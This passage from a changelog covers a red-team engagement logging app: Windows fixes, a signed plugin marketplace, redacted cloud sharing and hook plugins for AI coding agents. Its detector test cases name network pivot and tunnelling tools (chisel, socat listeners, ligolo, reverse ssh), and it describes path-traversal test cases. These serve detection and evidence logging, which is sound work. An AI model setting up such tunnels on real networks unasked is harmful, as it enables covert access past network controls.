  `$PROFILE` one-liner. Matches the copy in `docs/windows-setup.md`.
  Audit **P2-1**.
- **cloud-share.ts tar.exe ENOENT**: Windows Server 2016 / pre-1803
  Windows 10 don't ship `tar.exe`. The bare `tar.exe exit null:` now
  becomes an actionable error message pointing operators at the
  Windows-update / git-for-windows fallback. Audit **P2-3**.
- **hooks-manager autoUpgrade CRLF-safe compare**: byte-equality
  compare was defeated by a Windows editor rewriting the installed
  `.sh` copy with CRLF, causing an unnecessary heuristic re-check. Now
  normalises `\r\n → \n` on both sides before compare. Audit **P2-4**.
- **browser-launcher LOCALAPPDATA candidates**: added the per-user
  Chrome / Edge / Brave paths (`%LOCALAPPDATA%\Google\Chrome\Application\
  chrome.exe` etc.) — non-admin Chrome installs default there and were
  invisible to the browser detector. Audit **P2-5**.
- **P2-2 already covered**: the v0.6.82 shell-source Windows-refusal
  branch makes the `bash.exe` (WSL stub) case a no-op; the button
  can't fire the corrupting code path. No standalone fix needed.
- **test coverage** (306 → 320, +14):
  - `test/paths.test.ts` (new, +11): every `isInsideDir()` edge — exact
    match, nested file, `..` escape, prefix-sibling attack, drive-letter
    case-fold, mixed separators, different-drive rejection, POSIX
    case-sensitivity, empty rel. Uses `path.win32` / `path.posix`
    explicitly so the Windows cases run correctly on macOS.
  - `test/hooks-manager.test.ts` (+3): Windows shell-source refusal
    returns `{success:false}` with a `docs/windows-setup.md` / `$PROFILE`
    pointer; unknown plugin id still fails uniformly. `pretendPlatform()`
    swaps `process.platform` in-place.

## v0.6.82 — 2026-08-01
Windows compatibility pass: closes 2 P0 + 6 P1 audit issues (see
`docs/WINDOWS_COMPAT_AUDIT.md`) plus the CI matrix that will catch
future regressions automatically.

- **ci**: `ci.yml` unit job now runs on `[ubuntu-latest, windows-latest]`
  matrix (e2e still Linux-only for now). Every subsequent Windows
  regression surfaces on PR instead of after a customer downloads the
  installer. **(P0-1)**
- **terminal-manager**: dropped `process.env.HOME || os.homedir()` — the
  HOME branch handed Git Bash / MSYS2 a POSIX-shaped `/c/Users/foo` that
  `pty.spawn` rejects as invalid Win32. Now just `os.homedir()`. **(P0-2)**
- **hooks-manager**: `installHook` refuses the `shell-source` branch on
  `process.platform === 'win32'` with a copy pointing at
  `docs/windows-setup.md`. Previously a plugin-contributed
  `shell-source` capture would fabricate `%USERPROFILE%\.bashrc` and
  append raw Windows paths to it. **(P0-3)**
- **plugins/manifest**: path-escape check uses `path.isAbsolute` + a
  `..` segment walk instead of `startsWith('/')`. Now catches `C:\foo`,
  `c:/foo`, `\\?\C:\`, and `\foo\bar` on Windows. **(P1-1)**
- **screenshot guard**: `screenshot:read` and `screenshot:deleteFile`
  now use `isInsideDir()` (case-insensitive `path.relative`) instead
  of `startsWith(screenshotDir)` — NTFS case-insensitivity would trip
  the old check when the renderer round-tripped a differently-cased
  drive letter. **(P1-2)**
- **TerminalView**: cwd tab label splits on `[\\/]` so a Windows
  `C:\Users\foo\proj` doesn't render as one giant unbroken label.
  **(P1-3)**
- **marketplace tar**: `spawnSync('tar.exe' …)` on `win32`, matching
  `cloud-share.ts`. Explicit `.exe` sidesteps PATHEXT fragility inside
  the Electron shim's inherited PATH. **(P1-4)**
- **mcp:info**: return `stdioCommand` + `stdioArgs` alongside
  `stdioPath` so `claude mcp add` on Windows (no shebang execution)
  can spawn `node <path>` directly. **(P1-5)**
- **terminal-manager auto-source**: skip the POSIX branch on `win32`
  entirely — sourcing a POSIX-slash-rewritten path into a Windows
  bash needs `cygpath -u` and nobody's asked. PowerShell branch
  remains active. **(P1-6)**

## v0.6.81 — 2026-08-01
- **+49 unit-test edge cases** across 7 modules: `pivot-detector` (empty
  input, reverse `-R` ssh, autossh SOCKS, ligolo proxy self-cert, chisel
  port-forward, socat TCP-LISTEN, 20 KB perf guard), `target-extractor`
  (empty/whitespace, 50 KB perf guard, `scp :path` capture, plugin
  extractors shadow built-ins, bad-regex skip counter, idempotent
  unregister, double-register cleanup), `redaction` (empty entry not
  match-all, unicode byte offsets, plugin rule merge/dedup/re-register-
  replace), `command-tagger` (register replace, global-flag stateless,
  20 KB perf guard), `chain-anchor` + `buildOtsBundle` (magic/version
  layout, unknown-id null, empty-anchor verify), `publisher-trust`
  (malformed base64 sig, empty message, bogus key skip so sibling
  verifies, homepage preserved on re-trust), and `loot-detector` (no-op
  without operatorId, per-instance dedup, plugin add/scan/unregister
  lifecycle). Suite 257 → 306, still ~2 s. No production bugs found —
  the code already handled every probed edge correctly.
- **Windows compatibility audit** (`docs/WINDOWS_COMPAT_AUDIT.md`,
  ~2200 words): 14 issues surfaced, ranked P0/P1/P2. Three P0 —
  (1) CI matrix is Ubuntu-only, nothing exercises Windows before
  release; (2) `terminal-manager.ts:115` reads `process.env.HOME` first,
  so Git Bash / MSYS2 hand pty a POSIX-shaped cwd; (3)
  `hooks-manager.ts:171` `shell-source` install branch writes to
  `%USERPROFILE%\.bashrc`, corrupting a Windows profile if a plugin-
  contributed capture reaches it. Six P1, five P2. Also documents 20+
  places already correct (all `os.homedir()` sites, `pathToFileURL`
  round-trips, tests swap both `HOME` + `USERPROFILE`). Fix order
  proposed — CI matrix first, since it surfaces the rest
  automatically.

## v0.6.80 — 2026-08-01
- **Cloud-share size ratios calibrated against real data**: measured a live
  616-screenshot / 35-cast / ~500-event project — actual gzip ratios were
  0.93x (JPEGs), 0.052x (ANSI casts), 0.246x (JSONL events). The v0.6.76
  defaults (1.02 / 0.15 / 0.20) over-estimated the compressed size of
  cast files by ~3× — operators would see the red "you'll blow the cap"
  warning on bundles that were nowhere near the cap. New defaults
  (1.00 / 0.10 / 0.25) track real behaviour, with the cast ratio kept
  slightly above observed as a safety margin. Test's expected math
  updated to match.
- **Terminal ↻ restart-in-place verified end-to-end**: exit shell → tab
  shows `↻` button → click → fresh pty (new pid) reuses the tab slot,
  label stays "終端 1", tab position preserved. No code change — this
  was the last v0.6.44 feature that had never been manually smoke-tested
  on a shipped DMG.

## v0.6.79 — 2026-08-01
- **Swap Aider → OpenCode plugin**: `examples/plugins/aider-hook/` dropped,
  `examples/plugins/opencode-hook/` added. Rationale: Aider has no
  first-class hook API (issues #1215 / #1337 still open — the only
  workaround was a subprocess.Popen monkey-patch that would fight upstream
  every release), whereas OpenCode ships a native plugin API
  (`tool.execute.after`) and auto-loads any `.mjs` / `.ts` from
  `.opencode/plugins/` or `~/.config/opencode/plugins/`. The new plugin is
  a single ~130-LOC ES module that reads `~/.redlog/api-token`, applies
  the same two-gate privacy filter (recording + cwd exclusion), redacts
  common secret patterns, and POSTs a `subtype: opencode_tool` event
  after every tool call. Verified against
  `https://opencode.ai/docs/plugins/` (2026-08). Example registry updated
  to serve the new tarball; `docs/plugin-development.md` §"Full example"
  rewritten to walk through the OpenCode plugin structure end-to-end.
- **Marketplace install-fail inline error**: install failures now show a
  persistent red box under the failing entry with the exact error + a
  dismiss button, matching the cloud-share pattern from v0.6.76. The
  transient toast still fires but no longer swallows the message before
  operators can read it. Reported after v0.6.74 DMG test — install
  refused because publisher untrusted, but the operator saw nothing on
  screen after the toast faded.
- **Config-level default registry URL**: new `marketplace.defaultRegistryUrl`
  in `config.yaml` — the Settings placeholder + one-click fetch (empty
  URL box) both honour it. Ships defaulting to this repo's example
  registry (`raw.githubusercontent.com/.../examples/registry/index.json`)
  so it works out of the box; air-gapped shops override to point at their
  internal mirror.

## v0.6.78 — 2026-08-01
- **UI hotfix**: five i18n strings added in v0.6.76–v0.6.77 used
  single-brace `{key}` interpolation, but the app's `t()` helper matches
  `{{key}}` only — so operators saw literal `{size} KB`, `{{n}}
  publishers`, `{cap} MB` on cloud-share cap warnings, etc. Ship-time
  DMG test on v0.6.74 caught the marketplace side (`{size} KB` under
  each listed plugin). Fixed all five (`marketplace.sizeKb`,
  `marketplace.publishersAdded`, `marketplace.suggestedPublishersTitle`,
  `cloudShare.capExceedWarning`, one more). No behaviour change beyond
  the display text.

## v0.6.77 — 2026-08-01
- **Codex + Aider plugin corrections** (verified against upstream docs):
  - Codex config path was wrong: `~/.codex/config.toml` (not
    `~/.config/codex/config.toml`). Hook block is
    `[[hooks.PostToolUse]]` (PascalCase), not `post_tool_use`. Verify
    command is `codex exec 'run <cmd>'`. Docs URL pinned in the script
    header (`learn.chatgpt.com/docs/hooks`).
  - Aider had **no shell-override env var** at all — the v0.6.76 plugin's
    `AIDER_SHELL_CMD` assumption is Aider issue #1215 / #1337, still
    open. Rewrote around what Aider *actually* does on the pexpect (TTY)
    code path: `os.environ['SHELL']`. Wrapper now parses `-i -c '<cmd>'`
    per real invocation and points the manifest at
    `SHELL=… aider` (per-invocation, not global rc). README documents
    the non-TTY / Windows / piped-input path as uncapturable with a link
    to `aider/run_cmd.py` and the two open issues.
- **Marketplace one-click publisher trust**: registries can now advertise
  a `publishers[]` block in `index.json` carrying SPKI keys; when the
  operator fetches a registry that lists publishers they haven't trusted
  yet, an amber banner surfaces "This registry suggests trusting N
  publisher(s)" with a Trust-all button. Skips the paste-a-base64-SPKI
  ceremony for well-known registries; individual publishers can still be
  untrusted from the Publishers tab. Example registry updated to include
  the `redlog-project` publisher block so the flow works out of the box
  at the default URL.
- **Test**: cloud-share preview raw vs approx-compressed math now covered
  by a dedicated unit test that plants known-size fixture files under
  the mocked project dir and asserts the 1.02x / 0.15x / 0.20x ratios.
  Suite 256 → 257.
- **E2E**: cloud-share flow assertion updated for the v0.6.76 label
  split (`Raw size (pre-zip)` + `Approx. zipped` replaced `Approx.
  size`). CI was red on this since v0.6.76; now 11/11 green in ~10 s.

## v0.6.76 — 2026-08-01
- **UX (Timeline)**: lane filter chips now scroll horizontally when the
  header narrows instead of wrapping onto a second row that pushed the
  minimap down. Reported: at 1280-wide with all lanes visible, the chip
  row was breaking the Attack Timeline header layout.
- **UX (cloud-share)**: three fixes reported after v0.6.71 usage —
  - Preview now shows both raw-bytes AND estimated-zipped size (v0.6.71
    only showed raw, which under-reported how close the operator was to
    the 100 MB cap since JSONL + text .cast compress hard). Added a red
    warning line when the compressed estimate is over cap.
  - New `cloudShare.maxBundleBytes` in config + Settings ▸ 資料 ▸
    Cloud share ▸ Advanced input so operators can raise the client-side
    cap. Note: the deployed Worker enforces its own `MAX_UPLOAD_MB`, so
    both need to be raised in tandem.
  - Persistent inline error box below the panel — the failure toast
    used to fade before the operator saw it. The box stays until they
    dismiss or retry.
- **examples/plugins/codex-hook + aider-hook** (new): reference
  implementations of the two integration tiers documented in
  `docs/plugin-development.md`. Codex uses the native hook API (stdin
  JSON, same shape as Claude Code); Aider uses the `AIDER_SHELL_CMD`
  shell-wrapper. Both apply the two-gate privacy filter (recording state
  + cwd exclusion list) and redact secrets before POST. Both are
  🟢 declarative — drop under `~/.redlog/plugins/` and reload.
- **examples/registry/** (new): a working example marketplace index
  hosting the three declarative plugins (recon-pack, codex-hook,
  aider-hook), signed with a bundled Ed25519 key. Point Settings ▸
  外掛市集 URL at
  `https://raw.githubusercontent.com/guan4tou2/REDLOG/main/examples/registry/index.json`
  to actually fetch + install. Marketplace UI placeholder updated to
  suggest the same URL. Real DNS at `plugins.redlog.dev` is a v2 item.
- **redlog-share-worker/smoke.js** (new): post-deploy smoke test.
  Verifies every endpoint in the two-step upload contract — `/health`,
  authed + unauthed `/api/share/init`, `PUT` to R2, `/share/:slug`
  download page, 302 redirect to signed R2, `/api/share/revoke/:slug`,
  post-revoke 404/410. Run with `node smoke.js <worker-url> <AUTH_TOKEN>`
  after `wrangler deploy`; exits 0 all-green, 1 on first failure.

## v0.6.75 — 2026-08-01
- **API sidecar self-heal**: `redlog-cli` was bailing with "no api-token
  found" on installs where the API server was clearly up (port 6660
  listening, /api/health 200) — because on some machines the sidecar
  files (`~/.redlog/api-token`, `~/.redlog/api-port`) had been dropped
  between an old `stopApiServer` and something else (macOS session
  restore, an operator cleanup, a Finder move). Two-part fix:
  - `stopApiServer` no longer unlinks the files. They're mode 0600, so
    leaving them across a stop/start cycle costs nothing; a startApiServer
    rewrite is idempotent.
  - Every request handler now runs `selfHealSidecarFiles()` — if either
    file is missing at request time, it's rewritten from the in-memory
    token+port. Effectively self-repairing whenever the CLI reads the
    file, so the operator never sees a broken CLI on a working server.

## v0.6.74 — 2026-08-01
- **Windows release-CI hotfix (round 4, root cause this time)**: the
  `localFileUploader` built its URL with `` `file://${destZip}` `` — on
  Windows that produces `file://C:\Users\...\.redlog\shares\...`, which is
  malformed (should be `file:///C:/Users/...` — three slashes + forward
  separators). Test assertions patched to accept backslashes in v0.6.73
  matched the string but `new URL(...).pathname` on the malformed form
  returned garbage and `fs.existsSync` failed. Fix at the source: use
  Node's `pathToFileURL()` which produces a spec-compliant URL on every
  OS, and consumers use `fileURLToPath()` to decode. Tests + E2E regex
  simplified back to a single-shape assertion.

## v0.6.73 — 2026-08-01
- **Windows release-CI hotfix (round 3)**: the v0.6.71-era cloud-share
  regex assertions only accepted forward slashes, but Windows produces
  `file://C:\Users\...\.redlog\shares\<sha8>\...` (backslashes) — so both
  `test/cloud-share.test.ts` and `e2e/cloud-share-flow.spec.ts` failed on
  Windows even after v0.6.72's zip archiver fix. Regex now accepts both
  separators (`[\\/]`) — same URL, OS-appropriate slashes.

## v0.6.72 — 2026-08-01
- **Windows release-CI hotfix**: v0.6.71's Windows zip path used
  `Compress-Archive -LiteralPath '$dir\*'`, but `-LiteralPath` is literal by
  design — it doesn't glob, so the zip was silently empty and the
  post-build `fs.statSync` blew up. Swap to `tar.exe -a -c -f` (Windows
  10+ ships bsdtar, which handles the `.zip` extension natively).
- **Cloud-share HTTPS backend lands (deployable, not deployed)**:
  new `redlog-share-worker/` — a Cloudflare Worker (~300 LOC) + `wrangler.toml`
  + README that a deployer runs against their own Cloudflare account. R2 for
  the bundle bytes, KV for per-share metadata, HMAC-signed short-lived
  PUT/GET tokens scoped to the sha256, `/api/share/init` → `/api/share/put/:sha`
  → `/share/:slug` public download page. `TODO(magic-link)` on the bearer
  auth per spec §10.
  - `src/core/config.ts` grows a `cloudShare: { endpoint, authToken }` block.
  - Settings ▸ 資料 ▸ Cloud share adds an "Advanced: HTTPS backend"
    collapsible with endpoint + token inputs and a stub-vs-https radio pair.
    When HTTPS is selected AND both fields set, the Share button dispatches
    to the real `httpsUploader` from `cloud-share-uploader.ts`. Still uses
    the same mandatory redaction gate.
  - `test/cloud-share-uploader.test.ts` — loopback-mocked unit test for the
    two-step wire contract (POST init → PUT bytes → sha256 re-check).
  - `README.md` gains a short "Cloud share backend (optional)" section
    linking to `redlog-share-worker/README.md`.
- **Marketplace E2E lands**: `e2e/marketplace-flow.spec.ts` — three tests
  (install a declarative plugin via IPC, trust a publisher via UI + confirm
  via listPublishers, install v1 → v2 → rollback restores v1's marker
  file). New dev-only `marketplace:testInstall` IPC gated on `REDLOG_E2E=1`
  in main so the E2E can drive `installFromRegistry` with an injected
  fetcher — production paths keep HTTPS enforcement. Real gzipped POSIX
  ustar tarballs built in-test exercise the default `tar` extractor
  end-to-end. `npm run e2e` now runs 7 tests in ~5.9s.

## v0.6.71 — 2026-08-01
- **Cloud-share bundle v1** (spec: [`docs/CLOUD_SHARE_BUNDLE.md`](docs/CLOUD_SHARE_BUNDLE.md)).
  End-to-end flow lands with a local file:// stub uploader — real HTTPS
  backend gets wired next; this pass proves the client contract.
  - `src/core/cloud-share.ts` — wraps the existing local `exportBundle` with
    a `.zip` archive + outer `bundle.json` manifest carrying zip sha256,
    engagement metadata, event/sanitize counts, chain head. Uses `zip -r` on
    POSIX and `powershell Compress-Archive` on Windows.
  - `src/core/cloud-share-uploader.ts` — pluggable `Uploader` interface with
    two implementations: `localFileUploader` (writes to
    `~/.redlog/shares/<sha8>/` and mints a `file://` share URL, the v1
    default) and `httpsUploader` (POST /api/share/init → PUT signedUrl, gated
    on backend sha256 re-check per spec §5, unused from UI until the
    backend exists).
  - **Hard redaction gate**: `prepareCloudShareBundle` throws
    `RedactionGateError` unless the caller passes `reviewedByOperator: true`.
    The Settings UI wires this to a mandatory checkbox above the Share
    button that reads out what the bundle contains (events, sanitize count,
    screenshots, cast files, approx size, chain head) — no muscle-memory
    click-through.
  - `BundleTooLargeError` at the 100 MB spec cap; oversized `.zip` cleaned
    up rather than left on disk.
  - Settings ▸ 資料 gains a Cloud share panel above the integrity check
    with expiry picker (24h/7d/30d/90d/never), review-gate checkbox, and a
    copy-URL + open buttons once the stub returns a share path.
  - Coverage: 7 new tests (`cloud-share.test.ts`) covering the gate,
    manifest shape, oversized-cleanup, stub upload sha8 bucketing, and
    `expiresIn: 'never'` omission. Suite now 255 tests, 27 files.

## v0.6.70 — 2026-08-01
- **Windows release-CI hotfix**: `publisher-trust` + `marketplace` tests only
  swapped `$HOME`, but Windows resolves `os.homedir()` via `USERPROFILE` —
  so on Windows the tests silently leaked the runner's real `~/.redlog` in
  and out, tripping length-of-1 vs got-2 rotation asserts. Swap both env
  vars per test. Unblocks the v0.6.68 / v0.6.69 Windows build.

## v0.6.69 — 2026-08-01
- **Marketplace UI wired end-to-end**: Settings ▸ 外掛市集 exposes the v1
  runtime that landed in v0.6.68. Three sub-tabs — Plugins (paste registry
  URL → fetch → install), Publishers (paste SPKI Ed25519 public key to
  trust a publisher; untrust; list pinned keys), Revocations (surfaces the
  local revocation cache so operators can see why an install was blocked).
  All calls go through preload `window.redlog.marketplace.*` — the core
  fetch/verify/install pipeline stays where the unit tests can hit it.
- **CI**: `.github/workflows/ci.yml` runs on every PR and main push —
  vitest (`npm test`) + build + Playwright-for-Electron (`npm run e2e`)
  under xvfb. Failures upload screenshots + playwright-report as artifacts.
- **Dual-ABI test hooks**: `pree2e` runs `electron-rebuild -f -o
  better-sqlite3` before Playwright launches so operators (and CI) don't
  have to remember which ABI the last command left better-sqlite3 built
  for. `pretest` already handled the Node → Electron direction.

## v0.6.68 — 2026-08-01
- **Plugin marketplace v1 core** (spec: [`docs/PLUGIN_MARKETPLACE.md`](docs/PLUGIN_MARKETPLACE.md)).
  Deliberately shipped without UI wiring — the runtime + trust primitives
  land first so the Settings panel can be layered on top without redesigning
  the security model mid-flight.
  - `src/core/plugins/publisher-trust.ts` — per-publisher trust store at
    `~/.redlog/trusted-publishers.json`; Ed25519 SPKI keys with rotation
    (multiple pinned keys per publisher), fingerprint helper, and detached-
    signature verify against ALL pinned keys (so key rotation doesn't break
    previously signed releases).
  - `src/core/plugins/marketplace.ts` — HTTPS registry client with hard
    caps (5 MB tarball, 1 MB index), fetch → sha256 verify → signature
    verify → validateManifest → id/version/publisher match → atomic swap
    into `~/.redlog/plugins/<id>/` with the previous copy snapshotted to
    `.<id>-versions/<oldHash>/` for rollback. Privileged plugins REQUIRE a
    verified signature; declarative plugins may install unsigned. Revocation
    list at `~/.redlog/plugins/revocations.json` blocks per-plugin or per-
    publisher.
  - `cli/redlog-sign.js` (new bin) — `keygen` writes an Ed25519 keypair
    (mode 0600); `sign <tarball> --key kp.json` computes sha256, signs it
    with the private key, sniffs `id`/`version` from the tarball's
    `plugin.json`, and prints a ready-to-paste registry index entry.
  - Coverage: 27 new tests (`publisher-trust.test.ts`, `marketplace.test.ts`,
    `redlog-sign.test.ts`) covering rotation, mismatched publishers, revocation
    both scopes, sha256 mismatch, privileged-without-signature rejection,
    unsigned-declarative accept, snapshot + rollback round-trip, and the CLI
    end-to-end (spawnSync). Suite now 248 tests.
- **E2E**: `e2e/project-flow.spec.ts` — three tests sharing one Electron
  launch: create+open a project (screenshot proof to
  `e2e/screenshots/project-opened.png`), Cmd+1..9 tab switch regression
  guard for the v0.6.67 focus fix, and `chain.verify({ full: true })` on a
  fresh project returns `ok: true`. Adds `data-testid` attributes to
  `App.tsx` view root and `ProjectPicker` outer container (attributes only,
  no logic touched). `playwright.config.ts` set to `workers: 1` because
  Electron's single-instance lock + port 6660 bind means parallel launches
  step on each other.

## v0.6.67 — 2026-08-01
- **Fix**: `⌘/Ctrl+1..9` nav shortcuts silently missed the very first press
  after launch. The renderer's `window.addEventListener('keydown')` only fires
  when the webview has keyboard focus, and a fresh Electron launch (or a
  project-picker unmount) can leave the window "active" at the OS level but
  focus-less. `windows.ts` now calls `win.focus() + webContents.focus()` from
  `ready-to-show`, so the first shortcut works.
- **Tests**: new coverage for the three v0.6.60–64 modules that shipped
  without unit tests — `cast-slice` (window slicing, ANSI strip, malformed
  lines), `target-extractor` (the `://`-scheme fallback that killed the
  `python -c "import json.dumps"` false positive), and `hooks-manager`'s
  broken-shell-hook detector. Suite is now 223 → 234 tests, 23 files.
- **E2E scaffold**: `e2e/smoke.spec.ts` + `playwright.config.ts` — one
  Playwright-for-Electron smoke test that launches the built `out/main`,
  asserts the first window title, and screenshots. Not wired to CI yet;
  `npm run e2e` after `npm run build`. `@playwright/test` added to
  devDependencies.
- **Docs**: `docs/PLUGIN_MARKETPLACE.md` — v1 spec draft (git-repo-as-registry,
  Ed25519 signing, two-step publisher-then-capability consent, revocation
  list, threat model). Not implemented; unblocks the next design pass.
- **Docs**: `docs/CLOUD_SHARE_BUNDLE.md` — v1 spec draft for post-engagement
  cloud share (R2 + Workers default with mandatory BYO-bucket, hard redaction
  gate before upload, 40-bit unguessable share URLs, magic-link auth). Also
  spec-only.

## v0.6.65 — 2026-07-31
- docs: agent hook plugin guide — three tiers (native API / SHELL wrapper /
  shell fallback), full Aider plugin skeleton, testing checklist. Anchors the
  answer to "how do I add support for a new AI agent".

## v0.6.64 — 2026-07-31
- Hook cwd config **inverted** from whitelist → exclusion list. Claude Code
  Bash calls default to being logged whenever RedLog records; Settings ▸ 整合
  lets operators opt paths OUT (personal notes, hobby coding, secrets).
- Settings UI: native folder picker for the exclusion list (`hookConfig:pickPath`).
- Shell hook auto-upgrade at startup — anyone still holding a pre-v0.6.47
  `pid: $$$` copy gets silently overwritten with the fresh bundled version.
  Fires a `system.hook_auto_upgrade` chain event when it does.
- Target extractor fallback requires `://` before running DOMAIN_RE — stops
  `python -c "import json.dumps"` and `source .../shell-preexec-hook.sh` from
  landing in the timeline as a target.

## v0.6.63 — 2026-07-31
- Layout: `html/body/#root { height: 100% }` cascade + App root + ProjectPicker
  root `h-screen → h-full`. Fixes the StatusBar / Timeline event log being
  pushed below the visible window edge by body zoom.

## v0.6.62 — 2026-07-31
- Layout: `body height: calc(100vh / var(--app-zoom, 1.1))` so `zoom: 1.1`
  doesn't overflow the viewport.
- Timeline: hardcoded 240 px detail panel / 160-180 px event log heights
  replaced with 45vh / 18vh / 22vh so tighter fonts don't push rows off.
- `session_end` events no longer suppressed as housekeeping — the
  "▶ Replay entire session" button needs them to anchor onto.

## v0.6.61 — 2026-07-31
- Test: assertions updated for the new `ssh user@host` → interactive pivot
  behaviour so CI stops failing on the intended change.

## v0.6.60 — 2026-07-31
- SSH → VPS coverage (three-part):
  - **A**: session-level replay — Timeline shell.session_end grows a
    `▶ Replay entire session` button that slices the full .cast, showing
    everything typed after an ssh line.
  - **B**: `ssh user@host` with no `-D/-L/-R` now fires a pivot event
    (`subtype: 'interactive'`, `via: host`).
  - **C**: `hooks/vps-deploy.sh` — `install / tunnel / uninstall` subcommands
    that scp the hook to a VPS and run `ssh -R 6660:127.0.0.1:6660` so
    remote commands hit the local chain through the reverse tunnel.

## v0.6.59 — 2026-07-30
- Claude Code hook: two-gate privacy filter — RedLog must be recording AND
  the cwd must match one of the user's declared paths before an event is
  sent. Managed through Settings ▸ 整合. **Inverted to an exclusion list
  in v0.6.64 based on user feedback.**

## v0.6.58 — 2026-07-30
- `hooks/claude-code-hook.sh` rewritten to read Claude Code's new stdin JSON
  contract (the CLAUDE_TOOL_* env vars have been gone for a while, so the
  hook silently no-op'd for months). Also fixes a bash `${VAR:-{}}` quirk
  that mangled the JSON. New event fields: `session_id`, `transcript_path`,
  `cwd`. Conversation content is deliberately NOT copied into the chain —
  transcript_path is a pointer for on-demand audit.

## v0.6.57 — 2026-07-30
- HUD pin (📌/📍) moved out of the top-right chrome and into a bottom-row
  action pair with the MARK button in the expanded panel.
- Dashboard `p-5 space-y-5` → `p-4 space-y-3` so the 快捷鍵 block stays in
  the initial view under the enlarged font/zoom.

## v0.6.56 — 2026-07-30
- Repo-wide `text-[10px]` → `text-xs` and `text-[9px]` → `text-[11px]`
  (155+22 occurrences) so hint text scales with the operator's zoom.
- HUD pass-through mode: window.setOpacity() replaced with per-element dim
  in the renderer so the external IP row stays fully readable while
  everything else dims.

## v0.6.55 — 2026-07-30
- Chain verify: NULL prev_hash on pre-v0.2 events treated as a legacy
  migration sentinel, not tampering. New events still get strict linkage
  checking.

## v0.6.54 — 2026-07-30
- Dashboard: `事件` and `證據鏈` cards merged (they always moved in
  lockstep). Drift now surfaces as a red "chain N ≠ events M" callout —
  itself a tamper signal.
- Screenshot dedup: dHash (difference hash) added on top of SHA-256 so
  the periodic capture doesn't spam the chain with clock-tick duplicates.

## v0.6.53 — 2026-07-30
- Chain verify walks four hash shapes (v0.1 / v0.2 / v0.6 / v0.6+null) so
  older projects don't report BROKEN just because the schema evolved.

## v0.6.51 — 2026-07-30
- HUD click-through mode (Settings ▸ HUD) — HUD stops receiving mouse
  events; opacity drops to a chosen level (default 40%).
- **Closes #7** — periodic screenshot: Off / 30s / 60s / 5m (Settings ▸
  資料). Existing SHA-256 dedup skips identical frames.
- CLI sanitize: `opts is not defined` crash fixed (missing `flags` rename).

## v0.6.50 — 2026-07-30
- Larger default text: html `font-size: 17px` + body `zoom: 1.1`. Settings ▸
  一般 exposes an interface text size control (100/110/120/135%).

## v0.6.49 — 2026-07-30
- Chain verify tries key-absent shape first, falls back to null-inclusive —
  reconciles the two ways monotonicNs was hashed across versions.
- Search shortcut ⌘/ replaced with `e.code === 'Slash'` + `⌘K` alias
  (macOS delivered `Unidentified` for `⌘/` and it never fired).
- Added `docs/RELEASE_CHECKLIST.md`.

## v0.6.48 — 2026-07-30
- HUD corner-snap keychord `⌘⌥+Arrow` → `⌘⇧⌥+Arrow` (macOS Sequoia's
  built-in window tiling was eating the two-key combo).
- `events.query` accepts `before?: number`; Timeline `loadMore` anchors on
  the oldest known event so auto-load actually walks back through history.
- Marks pin toggle relocated from every list row to the mark detail panel
  (low-frequency action).

## v0.6.47 — 2026-07-30
- **Reverts** the chain-embedded stdout capture (v0.6.44). TUI tools would
  blow the 256 KB cap in seconds and ANSI escapes made stored output
  unreadable.
- **Replaces** with on-demand replay from the asciinema .cast on disk —
  `readCastSlice()` in core, `POST /api/terminal/replay`, `▶ Replay stdout`
  button on shell.command_end.
- Fixes pre-existing `hooks/shell-preexec-hook.sh` `pid: $$$` typo — every
  command_start / command_end hook call was silently failing since v0.6.20,
  meaning the built-in terminal had no command timeline events for over
  two years. Also adds REDLOG_TERMINAL_ID env for round-tripping in
  payloads.

## v0.6.44 — 2026-07-30
- Timeline auto-load-more on left-edge scroll (audit #3).
- Terminal tab labels: `~/<cwd basename>` + red `✕N` when the last command
  exited non-zero.
- Marks: pin toggle + persistent order via localStorage.

## v0.6.43 — 2026-07-30
- HUD `⌘⌥+Arrow` corner-snap (multi-monitor-aware; later moved to
  `⌘⇧⌥+Arrow` in v0.6.48).
- CLI: `recording [status|pause|resume|toggle]` + `quickmark [list|add]`.

## v0.6.42 — 2026-07-30
- Loot panel: type filter chips + dedup toggle.
- Screenshots grid: trigger filter chips.
- Timeline: ↑/↓ walks the selected event across visible events.
